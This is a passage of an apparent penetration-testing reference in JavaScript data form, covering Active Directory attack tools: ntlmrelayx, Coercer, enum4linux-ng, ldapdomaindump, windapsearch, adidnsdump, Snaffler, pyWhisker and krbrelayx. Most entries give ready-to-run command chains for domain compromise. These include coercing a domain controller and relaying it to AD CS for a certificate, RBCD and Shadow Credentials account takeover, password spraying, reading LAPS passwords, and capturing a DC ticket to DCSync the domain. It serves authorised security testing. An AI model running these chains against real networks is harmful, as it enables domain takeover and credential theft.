              ["PetitPotam / Coercer (MS-EFSRPC)", "AD CS web enrolment for ESC8 — DC auth to a cert"],
              ["PrinterBug (MS-RPRN)", "LDAP for RBCD against the coerced machine"],
              ["DFSCoerce (MS-DFSNM)", "Whichever service is unsigned and useful"],
              ["WebDAV coercion", "LDAPS, because WebDAV auth is HTTP and cross-protocol relays cleanly"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Find unsigned targets first", cmd: "# only hosts without SMB signing are relay targets\nnetexec smb 10.10.10.0/24 --gen-relay-list targets.txt\nntlmrelayx.py -tf targets.txt -smb2support -i" },
              { label: "ESC8 — coerce a DC, relay to the CA, get a TGT", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support \\\n  --adcs --template DomainController\n# in another terminal, coerce the DC:\nPetitPotam.py -u user -p pass attacker_ip dc01_ip\n# then use the issued cert:\ncertipy auth -pfx dc01.pfx" },
              { label: "RBCD takeover via LDAP relay", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access --no-dump\n# coerce the target computer to authenticate; ntlmrelayx configures RBCD\n# then impersonate:\ngetST.py -spn cifs/target -impersonate Administrator domain/attacker_pc\\$" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Relaying only works where a protection is missing: SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web. Enumerate those conditions first — netexec's --gen-relay-list does the SMB part.",
              "You cannot relay authentication back to the host it came from. Always relay to a different, useful target.",
              "The AD CS ESC8 path is the highest-impact relay on most domains: coerce a DC, relay its machine auth to the CA, and receive a certificate you can turn into a TGT.",
              "Pair it with Coercer or PetitPotam to generate the authentication on demand rather than waiting for Responder to catch one.",
              "See the Coercion & NTLM Relay and AD CS theory pages for the full mechanism."
            ]
          }
        ]
      },
      {
        id: "coercer",
        name: "Coercer",
        url: "https://github.com/p0dalirius/Coercer",
        description: "Forces a Windows host to authenticate to you across many coercion RPC methods.",
        brief: "Coercer automates authentication coercion: it calls remote procedures on a target that, by design, make that target connect back to a UNC path you specify — and when it connects, it authenticates as the machine account. Point that callback at Responder or ntlmrelayx and you have the victim's authentication.\n\nWhere older tools each abused a single method (PrinterBug, PetitPotam), Coercer sprays every known coercion vector across MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP and more, so if any one is reachable, it fires.",
        quickReference: [
          { label: "Coerce a host to authenticate to you", cmd: "coercer coerce -t dc01.target.local -l attacker_ip -u user -p pass -d target.local" },
          { label: "Scan which methods are available", cmd: "coercer scan -t dc01.target.local -u user -p pass -d target.local" },
          { label: "Fuzz for undocumented coercion paths", cmd: "coercer fuzz -t dc01.target.local -u user -p pass -d target.local" },
          { label: "Coerce authenticated as a machine account", cmd: "coercer coerce -t dc01 -l attacker_ip -u 'PC$' -H :<hash> -d target.local" }
        ],
        sections: [
          {
            title: "Modes",
            type: "table",
            columns: ["Mode", "What it does"],
            rows: [
              ["scan", "Test which coercion methods respond on the target without triggering a full callback"],
              ["coerce", "Actually trigger the callbacks to your listener — the attack"],
              ["fuzz", "Probe RPC methods systematically to find coercion paths not yet catalogued"]
            ]
          },
          {
            title: "Coercion Protocols",
            type: "table",
            columns: ["Protocol", "Classic name / method"],
            rows: [
              ["MS-RPRN", "PrinterBug — the print spooler's RpcRemoteFindFirstPrinterChangeNotification"],
              ["MS-EFSRPC", "PetitPotam — the Encrypting File System remote protocol (EfsRpcOpenFileRaw and others)"],
              ["MS-DFSNM", "DFSCoerce — the Distributed File System namespace management interface"],
              ["MS-FSRVP", "ShadowCoerce — the File Server VSS agent"],
              ["MS-EVEN", "The remote EventLog interface, ElfrOpenBELW"],
              ["Why so many", "Each is a separate patch/config surface; Coercer tries all of them so one missing hardening is enough"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <target>", "Host to coerce"],
              ["-l <listener>", "Where the victim should authenticate back to (your Responder/relay host)"],
              ["-u / -p / -d", "Credentials and domain — coercion usually needs an authenticated context"],
              ["-H <hash>", "Authenticate with an NT hash instead of a password"],
              ["--filter-method-name <s>", "Restrict to specific RPC methods"],
              ["--auth-type", "Choose the callback transport — SMB or HTTP (HTTP/WebDAV enables cross-protocol relay)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Coerce a DC into an ESC8 relay", cmd: "# listener: ntlmrelayx to the CA web endpoint\nntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# coerce:\ncoercer coerce -t dc01.target.local -l attacker_ip -u user -p pass -d target.local" },
              { label: "WebDAV coercion for cross-protocol LDAPS relay", cmd: "coercer coerce -t target01 -l attacker_ip@80/share \\\n  -u user -p pass -d target.local --auth-type http\n# WebDAV auth is HTTP, which relays cleanly to LDAPS for RBCD" },
              { label: "Scan first to avoid noise", cmd: "coercer scan -t dc01.target.local -u user -p pass -d target.local\n# fire coerce only against the methods that responded" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Coercion needs somewhere to send the authentication. Stand up Responder or ntlmrelayx before you coerce, or the callback lands nowhere.",
              "Machine accounts authenticate on coercion, which is why coercing a domain controller is so powerful — a DC's machine account is a high-value identity to relay.",
              "WebDAV (HTTP) callbacks relay to LDAPS cleanly, sidestepping SMB signing entirely — the preferred route to RBCD and Shadow Credentials.",
              "scan mode is the low-noise recon step; fuzz mode is loud and may crash the target's service, so keep it out of production windows.",
              "See the Coercion & NTLM Relay theory page for the end-to-end chain."
            ]
          }
        ]
      },
      {
        id: "enum4linux-ng",
        name: "enum4linux-ng",
        url: "https://github.com/cddmp/enum4linux-ng",
        description: "Rewritten SMB/RPC enumeration — users, shares, groups, and password policy.",
        brief: "enum4linux-ng is a modern rewrite of the classic enum4linux, pulling everything reachable over SMB and MS-RPC into one structured report: the domain SID, user and group lists (including via RID cycling), shares, the password policy, and OS details. It is the fast first look at a Windows host or domain, and it works with a null session, a guest session, or real credentials.\n\nThe value is breadth in one command — it saves you running a dozen rpcclient queries by hand — and the YAML/JSON output means the result is greppable rather than a wall of text.",
        quickReference: [
          { label: "Full enumeration of a host", cmd: "enum4linux-ng -A 10.10.10.10" },
          { label: "Null-session attempt", cmd: "enum4linux-ng -A -u '' -p '' 10.10.10.10" },
          { label: "Authenticated enumeration", cmd: "enum4linux-ng -A -u jdoe -p 'Passw0rd' 10.10.10.10" },
          { label: "RID cycling to enumerate users", cmd: "enum4linux-ng -R 10.10.10.10" },
          { label: "Machine-readable output", cmd: "enum4linux-ng -A -oJ result 10.10.10.10" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-A", "Do everything — the usual starting point"],
              ["-U / -G / -S", "Users / groups / shares only"],
              ["-P", "Password and lockout policy — read this before any spray"],
              ["-R", "RID cycling — enumerate accounts by walking SIDs when direct listing is blocked"],
              ["-u / -p", "Username and password ('' '' for a null session)"],
              ["-oJ / -oY", "Write JSON or YAML output"],
              ["-d", "Be more detailed where the protocol allows"]
            ]
          },
          {
            title: "What It Retrieves",
            type: "table",
            columns: ["Item", "Notes"],
            rows: [
              ["Domain SID", "The prefix every account SID shares — the basis for RID cycling"],
              ["Users", "Via RPC enumeration or RID cycling; the raw material for spraying and roasting"],
              ["Groups + members", "Including Domain Admins and other high-value groups where readable"],
              ["Shares", "Names and, where possible, read/write access — feeds share hunting"],
              ["Password policy", "Length, complexity, lockout threshold and window — the spray safety numbers"],
              ["OS info", "Version and build, for matching against known vulnerabilities"],
              ["NetBIOS / workgroup", "Domain membership and naming"]
            ]
          },
          {
            title: "Session Types",
            type: "table",
            columns: ["Session", "What you get"],
            rows: [
              ["Null session (-u '' -p '')", "Anonymous — sometimes still yields users, policy, and shares on legacy configs"],
              ["Guest", "Where the guest account is enabled — a surprising amount is often readable"],
              ["Authenticated", "Any valid domain credential unlocks full RPC enumeration"],
              ["Modern reality", "Null sessions are locked down on current Windows; expect to need at least one credential"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "First look at an unknown host", cmd: "enum4linux-ng -A 10.10.10.10 -oY host10\n# read the password policy section before doing anything active" },
              { label: "Build a user list with no creds", cmd: "# if null/guest gives a domain SID, cycle RIDs for usernames\nenum4linux-ng -R 10.10.10.10 | tee users_raw.txt\ngrep -oE '[A-Za-z0-9._-]+\\\\[A-Za-z0-9._-]+' users_raw.txt | cut -d\\\\ -f2 | sort -u > users.txt" },
              { label: "Hand off to spraying", cmd: "# policy from -P tells you the safe rate; users from -R/-U feed kerbrute\nkerbrute passwordspray -d target.local --dc 10.10.10.10 users.txt 'Season2026!'" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Read the password policy before any spray or brute. enum4linux-ng surfaces it in one flag; ignoring it is how engagements lock out the domain.",
              "Null and guest sessions are mostly closed on modern Windows. Do not conclude a host is hardened just because the anonymous run came back empty — retry authenticated.",
              "RID cycling is the fallback when direct user enumeration is blocked but you have the domain SID; it is slower but frequently works when -U does not.",
              "The YAML output is genuinely useful — keep it as evidence and grep it later rather than re-running the scan.",
              "netexec covers much of the same ground with a different feel; running both and comparing is normal."
            ]
          }
        ]
      },
      {
        id: "ldapdomaindump",
        name: "ldapdomaindump",
        url: "https://github.com/dirkjanm/ldapdomaindump",
        description: "Dumps the whole domain over LDAP into readable HTML, JSON, and CSV.",
        brief: "ldapdomaindump authenticates to a domain controller over LDAP with any valid credential and pulls the entire directory — users, groups, computers, policies, trusts — writing it out as browsable HTML tables, JSON for tooling, and CSV for a spreadsheet. It is the fastest way to get an offline, greppable copy of who and what exists in a domain.\n\nBecause a normal domain user can read the vast majority of the directory, this needs no special privilege — it simply exercises the read access every authenticated principal already has.",
        quickReference: [
          { label: "Dump the domain to the current dir", cmd: "ldapdomaindump -u 'target.local\\jdoe' -p 'Passw0rd' 10.10.10.10" },
          { label: "Over LDAPS", cmd: "ldapdomaindump -u 'target.local\\jdoe' -p 'Passw0rd' ldaps://10.10.10.10" },
          { label: "With an NT hash", cmd: "ldapdomaindump -u 'target.local\\jdoe' -p ':<nthash>' 10.10.10.10" },
          { label: "Output to a folder", cmd: "ldapdomaindump -o ./ldapdump -u 'target.local\\jdoe' -p pass 10.10.10.10" }
        ],
        sections: [
          {
            title: "Output Files",
            type: "table",
            columns: ["File", "Contents"],
            rows: [
              ["domain_users.html", "Every user with attributes, flags, and group membership — the file you open first"],
              ["domain_computers.html", "Computer accounts, OS versions, and last-logon data"],
              ["domain_groups.html", "Groups and their members, including the privileged ones"],
              ["domain_policy.html", "Password and lockout policy"],
              ["domain_trusts.html", "Trust relationships to other domains and forests"],
              ["*_by_group / users_by_*", "Cross-referenced views, e.g. users grouped by privilege"],
              [".json / .grep files", "Same data for tooling and quick grepping"]
            ]
          },
          {
            title: "What to Look For",
            type: "table",
            columns: ["Signal", "Why it matters"],
            rows: [
              ["userAccountControl flags", "DONT_REQ_PREAUTH (AS-REP roastable), TRUSTED_FOR_DELEGATION (delegation abuse), PASSWD_NOTREQD"],
              ["servicePrincipalName set", "The account is Kerberoastable"],
              ["adminCount=1", "Currently or historically privileged — a protected, high-value account"],
              ["Description fields", "Passwords in descriptions are a genuinely common finding"],
              ["Old computer OS versions", "Unsupported Windows still domain-joined"],
              ["Nested group membership", "Indirect paths into privileged groups that are easy to miss by eye"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard offline domain copy", cmd: "mkdir ldapdump && cd ldapdump\nldapdomaindump -u 'target.local\\jdoe' -p 'Passw0rd' 10.10.10.10\n# open domain_users_by_group.html in a browser" },
              { label: "Grep for the quick wins", cmd: "# passwords left in description fields\ngrep -i 'pass\\|pwd\\|cred' domain_users.json\n# accounts with pre-auth disabled\ngrep -i 'DONT_REQ_PREAUTH' domain_users.grep\n# Kerberoastable accounts\ngrep -i 'servicePrincipalName' domain_users.json" },
              { label: "Feed BloodHound-style analysis", cmd: "# ldapdomaindump is the flat view; run BloodHound for the graph\n# use the flat dump to spot description-field creds BloodHound will not flag" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Any authenticated domain user can read almost all of this. It is not an exploit — it is the read access AD grants by default, which is exactly why it is so productive.",
              "The description-field password is a cliché because it keeps being true. Grep for it first, every time.",
              "The HTML by-group views make nested privileged membership visible at a glance, which is easy to miss reading raw attributes.",
              "This is the flat inventory; BloodHound is the relationship graph. They answer different questions — use both.",
              "See the LDAP and AD Fundamentals theory pages for what these attributes and flags actually mean."
            ]
          }
        ]
      },
      {
        id: "windapsearch",
        name: "windapsearch",
        url: "https://github.com/ropnop/go-windapsearch",
        description: "Targeted LDAP queries for common AD objects from the command line.",
        brief: "windapsearch runs the LDAP queries you reach for constantly — all users, all computers, privileged accounts, Kerberoastable accounts, unconstrained-delegation hosts — as named subcommands, so you do not have to hand-write LDAP filters. Where ldapdomaindump takes everything, windapsearch is surgical: ask one question, get one clean answer, pipe it onward.\n\nThe Go rewrite is a single static binary, which makes it convenient to drop onto a jump host with no Python dependencies.",
        quickReference: [
          { label: "All domain users", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m users" },
          { label: "Privileged users", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m privileged-users" },
          { label: "Kerberoastable accounts", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m spns" },
          { label: "Unconstrained delegation hosts", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m unconstrained" },
          { label: "Raw custom LDAP filter", cmd: "windapsearch -d target.local -u jdoe -p pass --custom '(objectClass=trustedDomain)'" }
        ],
        sections: [
          {
            title: "Modules",
            type: "table",
            columns: ["Module", "What it returns"],
            rows: [
              ["users", "All user objects"],
              ["computers", "All computer objects, with OS where present"],
              ["groups", "All groups"],
              ["privileged-users", "Members of the built-in privileged groups (Domain/Enterprise Admins and friends)"],
              ["spns", "Accounts with a servicePrincipalName — the Kerberoast target list"],
              ["unconstrained", "Hosts and accounts trusted for unconstrained delegation"],
              ["gpos", "Group Policy Objects"],
              ["custom", "Any raw LDAP filter you supply"]
            ]
          },
          {
            title: "Connection & Auth",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target domain FQDN"],
              ["--dc <host>", "Specific domain controller to query"],
              ["-u <user>", "Bind user, usually user@domain form"],
              ["-p <pass>", "Password"],
              ["--secure", "Use LDAPS (636) instead of LDAP (389)"],
              ["-U / --unauth", "Attempt an anonymous bind"],
              ["--attrs <list>", "Return only the attributes you care about"]
            ]
          },
          {
            title: "Useful Custom Filters",
            type: "table",
            columns: ["Filter", "Finds"],
            rows: [
              ["(userAccountControl:1.2.840.113556.1.4.803:=4194304)", "Accounts with pre-auth disabled (AS-REP roastable)"],
              ["(servicePrincipalName=*)", "Kerberoastable accounts, the manual version of -m spns"],
              ["(userAccountControl:1.2.840.113556.1.4.803:=524288)", "Accounts trusted for delegation"],
              ["(adminCount=1)", "Protected / historically privileged accounts"],
              ["(&(objectCategory=person)(description=*pass*))", "Descriptions mentioning a password"],
              ["(ms-MCS-AdmPwd=*)", "LAPS-managed local admin passwords, where you can read them"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Roast targets in one shot", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m spns --attrs sAMAccountName,servicePrincipalName\n# feed the account names to a Kerberoast request" },
              { label: "Map the privileged surface", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m privileged-users\nwindapsearch -d target.local -u jdoe@target.local -p pass -m unconstrained" },
              { label: "Hunt LAPS you can read", cmd: "windapsearch -d target.local -u jdoe -p pass \\\n  --custom '(ms-MCS-AdmPwd=*)' --attrs dNSHostName,ms-MCS-AdmPwd" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The single static Go binary is the practical draw — no Python, no dependencies, easy to stage on a locked-down jump host.",
              "The bitwise UAC filters (1.2.840.113556.1.4.803) are worth memorising; they express 'flag X is set' and drive most of the interesting queries.",
              "It is surgical where ldapdomaindump is exhaustive. Use windapsearch to answer a specific question mid-engagement and ldapdomaindump for the full offline copy.",
              "Reading ms-MCS-AdmPwd returns a cleartext local admin password wherever your principal has the delegated read right — always worth checking.",
              "See the LDAP theory page for the query language and the Kerberoasting/Delegation pages for what these targets are."
            ]
          }
        ]
      },
      {
        id: "adidnsdump",
        name: "adidnsdump",
        url: "https://github.com/dirkjanm/adidnsdump",
        description: "Enumerates Active Directory-Integrated DNS to reveal hidden internal records.",
        brief: "When DNS is Active Directory-Integrated, every zone record is stored in the directory, and any authenticated user can read the zone — including records that DNS itself hides from a normal zone transfer. adidnsdump enumerates those records over LDAP, resolving the ones whose names are not directly listed, and hands you the internal hostname-to-IP map.\n\nOn an internal engagement this is one of the fastest ways to turn 'a valid domain user' into 'a complete picture of internal infrastructure', because the DNS zone names everything: servers, workstations, appliances, and the naming convention behind them.",
        quickReference: [
          { label: "Dump the AD DNS zone", cmd: "adidnsdump -u 'target.local\\jdoe' -p 'Passw0rd' 10.10.10.10" },
          { label: "Resolve hidden records too", cmd: "adidnsdump -u 'target.local\\jdoe' -p 'Passw0rd' -r 10.10.10.10" },
          { label: "List the available zones first", cmd: "adidnsdump -u 'target.local\\jdoe' -p 'Passw0rd' --print-zones 10.10.10.10" },
          { label: "Output to CSV", cmd: "adidnsdump -u 'target.local\\jdoe' -p pass 10.10.10.10 (writes records.csv)" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-u / -p", "Domain credentials (any authenticated user is enough)"],
              ["-r", "Resolve records whose node name is hidden by querying DNS for them directly"],
              ["--print-zones", "List the DNS zones stored in the directory before dumping"],
              ["--dns-tcp", "Force DNS resolution over TCP"],
              ["-z <zone>", "Target a specific zone rather than the default"],
              ["--ssl", "Use LDAPS for the directory connection"]
            ]
          },
          {
            title: "Why Hidden Records Exist",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["ADIDNS storage", "AD-Integrated zones live in the directory partition, readable by authenticated users over LDAP"],
              ["The 'hidden' node", "Records where the LDAP node lists a name but not its data still resolve if you query DNS for that name"],
              ["-r resolution", "adidnsdump reads the node names from LDAP, then resolves each via DNS to recover the address"],
              ["What DNS hides", "A standard zone transfer is usually blocked; the LDAP path sidesteps that restriction entirely"]
            ]
          },
          {
            title: "What It Reveals",
            type: "table",
            columns: ["Record type", "Value"],
            rows: [
              ["A / AAAA", "Internal host-to-IP mapping — the core inventory"],
              ["CNAME", "Aliases that hint at service roles (vpn, mail, git, jenkins)"],
              ["SRV", "Service locations — where Kerberos, LDAP, and other services live"],
              ["Naming convention", "The scheme itself (e.g. WKS-, SRV-, region codes) predicts hosts you have not seen"],
              ["Non-Windows assets", "Appliances and Linux hosts registered in the zone that other AD tools miss"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full internal DNS map", cmd: "adidnsdump -u 'target.local\\jdoe' -p 'Passw0rd' -r 10.10.10.10\n# records.csv now maps internal hostnames to IPs\ncut -d, -f2 records.csv | sort -u > internal_hosts.txt" },
              { label: "Derive the naming convention", cmd: "cut -d, -f1 records.csv | sort -u\n# patterns like SRV-, WKS-, -DC0x tell you what to expect and predict" },
              { label: "Feed host discovery", cmd: "# resolved IPs become scan targets (within scope and authorisation)\nnetexec smb internal_hosts.txt -u jdoe -p pass" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Any authenticated user can read an AD-Integrated zone. This is designed behaviour, not a vulnerability, which is what makes it reliable across engagements.",
              "Use -r. Without it you get the node names but miss the addresses for the hidden records, which are often the interesting ones.",
              "The naming convention you recover is as valuable as the records themselves — it predicts hostnames you can then target directly.",
              "This finds non-Windows assets registered in DNS that pure-AD tooling overlooks, widening the internal picture considerably.",
              "See the LDAP and AD Fundamentals theory pages for how ADIDNS sits inside the directory."
            ]
          }
        ]
      },
      {
        id: "snaffler",
        name: "Snaffler",
        url: "https://github.com/SnaffCon/Snaffler",
        description: "Crawls accessible file shares hunting for credentials and sensitive data.",
        brief: "Snaffler walks the domain's computers, finds the shares you can read, and then hunts inside them for the things that matter — passwords in scripts, config files with connection strings, private keys, KeePass databases, backup files, and hundreds of other patterns — using a tuned rule set that ranks each hit by how likely it is to be a real secret.\n\nThe problem it solves is scale. A domain has thousands of files across hundreds of shares; nobody reads them by hand. Snaffler does, and colour-codes the output so the red hits are the ones worth opening.",
        quickReference: [
          { label: "Standard domain-wide hunt", cmd: "Snaffler.exe -s -o snaffler.log" },
          { label: "Target specific hosts", cmd: "Snaffler.exe -n host1,host2 -s -o snaffler.log" },
          { label: "Share enumeration only (no file content)", cmd: "Snaffler.exe -y -o shares.log" },
          { label: "Tune verbosity to the interesting hits", cmd: "Snaffler.exe -s -v data -o snaffler.log" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-s", "Print results to stdout as it goes"],
              ["-o <file>", "Write the full log to a file"],
              ["-n <hosts>", "Target a specific comma-separated host list instead of discovering via the domain"],
              ["-i <path>", "Snaffle a specific local or UNC path rather than the whole domain"],
              ["-y", "Enumerate shares only — do not crawl file contents"],
              ["-v <level>", "Verbosity: data (hits only) up to trace (everything)"],
              ["-m <path>", "Copy found files to a local loot directory"],
              ["-l <n>", "Max file size to inspect"]
            ]
          },
          {
            title: "Result Severity",
            type: "table",
            columns: ["Colour / level", "Meaning"],
            rows: [
              ["Black", "Highest confidence — a private key, a KeePass DB, a file literally named 'passwords'"],
              ["Red", "Strong indicator — config with a likely credential, a script with a plaintext password"],
              ["Yellow", "Worth a look — interesting extension or keyword, more false positives"],
              ["Green", "Low priority — a share or file that matched a weak rule"],
              ["Triage order", "Read black and red first; they are where the actual wins are"]
            ]
          },
          {
            title: "What It Hunts For",
            type: "table",
            columns: ["Category", "Examples"],
            rows: [
              ["Credentials in code", "web.config, appsettings.json, .env, connection strings, hardcoded passwords in scripts"],
              ["Key material", "id_rsa, .pem, .pfx, .ppk, .key files"],
              ["Password stores", "KeePass (.kdbx), password manager exports, files named creds/passwords"],
              ["Config & infra", "unattend.xml, sysprep, Group Policy Preferences, vCenter/backup configs"],
              ["Scripts", "PowerShell, batch, and VBS with embedded credentials or service accounts"],
              ["Documents", "Spreadsheets and docs whose names suggest secrets"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Run it, then triage by severity", cmd: "Snaffler.exe -s -o snaffler.log\n# pull just the high-confidence hits\nfindstr /C:\"[Black]\" /C:\"[Red]\" snaffler.log" },
              { label: "Scope to hosts you already have footholds on", cmd: "Snaffler.exe -n fileserver01,appserver02 -s -m .\\loot -o snaffler.log\n# -m copies the hits locally for offline review" },
              { label: "Quiet share map first", cmd: "Snaffler.exe -y -o shares.log\n# decide which shares are worth a full content crawl before making the noise" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Triage by colour. Black and red are the real findings; yellow and green are mostly noise you skim only if the top hits come up dry.",
              "It is a .NET binary that generates real SMB traffic to many hosts — noisy and detectable. Scope it and run it in an authorised window.",
              "GPP passwords (cpassword in Groups.xml) are a classic Snaffler find and are decryptable with a public, Microsoft-published key.",
              "Use -m to copy hits into a loot folder so you review credentials offline instead of re-reading shares repeatedly.",
              "There is a Python port (snaffler.py) if you need to run it from a non-Windows foothold."
            ]
          }
        ]
      },
      {
        id: "pywhisker",
        name: "pyWhisker",
        url: "https://github.com/ShutdownRepo/pywhisker",
        description: "Adds Shadow Credentials by writing msDS-KeyCredentialLink to take over an account.",
        brief: "pyWhisker performs the Shadow Credentials attack. If you have write access to the msDS-KeyCredentialLink attribute of a target account — a right you often gain through an ACL or a relayed LDAP session — you can add your own certificate key pair to it. That lets you authenticate as the target via Kerberos PKINIT and recover its NT hash, without ever touching or resetting its password.\n\nIt is the quieter, more reversible cousin of a password reset: the legitimate owner is unaffected, and you clean up by removing the key you added.",
        quickReference: [
          { label: "Add a shadow credential", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action add" },
          { label: "List existing key credentials", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action list" },
          { label: "Remove one you added", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action remove --device-id <guid>" },
          { label: "Clear all (cleanup)", cmd: "pywhisker -d target.local -u jdoe -p pass --target victim --action clear" }
        ],
        sections: [
          {
            title: "Actions",
            type: "table",
            columns: ["Action", "What it does"],
            rows: [
              ["add", "Add a new key credential and output a certificate/PFX for authentication"],
              ["list", "Show the key credentials currently on the target"],
              ["remove", "Remove a specific key credential by its device ID"],
              ["clear", "Remove all key credentials — the clean-up action after you are done"],
              ["info", "Show detail on a specific key credential"]
            ]
          },
          {
            title: "Prerequisites",
            type: "table",
            columns: ["Requirement", "Notes"],
            rows: [
              ["Write to msDS-KeyCredentialLink", "GenericWrite/GenericAll over the target, or the specific attribute write — often found via BloodHound"],
              ["A 2016+ functional level", "PKINIT via key credentials requires the KeyCredentialLink support introduced then"],
              ["AD CS or a KDC cert", "The domain must support PKINIT — usually true wherever a DC has a certificate"],
              ["Reachable LDAP", "The attribute write happens over LDAP/LDAPS"]
            ]
          },
          {
            title: "The Attack Chain",
            type: "table",
            columns: ["Step", "Tool"],
            rows: [
              ["1. Confirm write access", "BloodHound shows AddKeyCredentialLink / GenericWrite over the target"],
              ["2. Add the key", "pywhisker --action add, which outputs a .pfx and its password"],
              ["3. Authenticate via PKINIT", "certipy auth or gettgtpkinit to get a TGT as the target"],
              ["4. Recover the NT hash", "The PKINIT exchange returns the target's NT hash (UnPAC-the-hash)"],
              ["5. Clean up", "pywhisker --action clear to remove the shadow credential"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full takeover of an account you can write to", cmd: "pywhisker -d target.local -u jdoe -p pass --target svc_sql --action add\n# note the emitted PFX and its password, then:\ncertipy auth -pfx svc_sql.pfx -dc-ip 10.10.10.10\n# you now hold svc_sql's TGT and NT hash" },
              { label: "Chain from a relayed LDAP session", cmd: "# ntlmrelayx with --shadow-credentials does this during a relay\nntlmrelayx.py -t ldap://dc01 --shadow-credentials --shadow-target victim\\$" },
              { label: "Clean up afterwards", cmd: "pywhisker -d target.local -u jdoe -p pass --target svc_sql --action clear" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This does not reset or change the target's password, so the legitimate owner keeps working and the account does not lock — much stealthier than a reset.",
              "It needs a 2016+ domain functional level and a domain that supports PKINIT (an AD CS or KDC certificate). On older domains, fall back to a password reset or RBCD.",
              "Always run the clear action when you are finished. A leftover key credential is both a loose end and an easy detection.",
              "It pairs directly with certipy auth for the PKINIT step and with ntlmrelayx's --shadow-credentials for the relay variant.",
              "See the AD CS and ACLs & DACLs theory pages for why the write access exists and what PKINIT is doing."
            ]
          }
        ]
      },
      {
        id: "krbrelayx",
        name: "krbrelayx",
        url: "https://github.com/dirkjanm/krbrelayx",
        description: "Kerberos relay and unconstrained-delegation abuse toolkit.",
        brief: "krbrelayx handles the Kerberos side of relay and delegation attacks that ntlmrelayx (which is NTLM-only) cannot. Its headline use is unconstrained delegation abuse: if you control a host trusted for unconstrained delegation, you coerce a target — ideally a domain controller — to authenticate to it, and krbrelayx captures the TGT that gets cached, giving you the target's Kerberos identity outright.\n\nIt also performs Kerberos relaying in scenarios where an attacker-controlled name resolution lets a Kerberos ticket be redirected, and it is the standard partner to the printerbug/coercion tools on the delegation path.",
        quickReference: [
          { label: "Capture TGTs via unconstrained delegation", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
          { label: "Export a captured TGT for reuse", cmd: "export KRB5CCNAME=DC01\\$@TARGET.LOCAL.ccache" },
          { label: "Trigger the DC to authenticate", cmd: "printerbug.py target.local/user:pass@dc01 attacker_host" },
          { label: "Then DCSync with the DC's ticket", cmd: "secretsdump.py -k -no-pass dc01.target.local" }
        ],
        sections: [
          {
            title: "Core Use Cases",
            type: "table",
            columns: ["Scenario", "What krbrelayx does"],
            rows: [
              ["Unconstrained delegation abuse", "Runs a listener that captures the TGT a coerced host caches when it authenticates to your delegation-trusted machine"],
              ["Kerberos relaying", "Relays Kerberos authentication where a name-resolution primitive (ADIDNS, mitm6) lets you redirect it"],
              ["SPN-less relay", "Works in cases NTLM relay cannot, because Kerberos service tickets are the currency"],
              ["Delegation to DCSync", "The captured DC TGT is used directly to replicate secrets"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-aesKey <key>", "The AES key of the delegation-trusted host account, to decrypt/accept the incoming ticket"],
              ["-hashes <lm:nt>", "Alternatively supply the host account NT hash"],
              ["--krbsalt / --krbpass", "Provide the salt and password to derive keys when you know the account password"],
              ["-t <target>", "Target for the relay variants"],
              ["-ip <addr>", "Interface/address for the listener"]
            ]
          },
          {
            title: "Unconstrained Delegation Chain",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["1. Find it", "A computer with TRUSTED_FOR_DELEGATION set — BloodHound flags these as unconstrained"],
              ["2. Control it", "You need the host's key material (compromise it, or own a computer object you created)"],
              ["3. Listen", "krbrelayx runs on that host with its AES key, waiting for inbound authentications"],
              ["4. Coerce", "printerbug/PetitPotam/Coercer forces the DC's machine account to authenticate to your host"],
              ["5. Capture", "The DC's TGT is cached on your host and krbrelayx exports it"],
              ["6. Impersonate", "Use the DC TGT to DCSync the domain"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
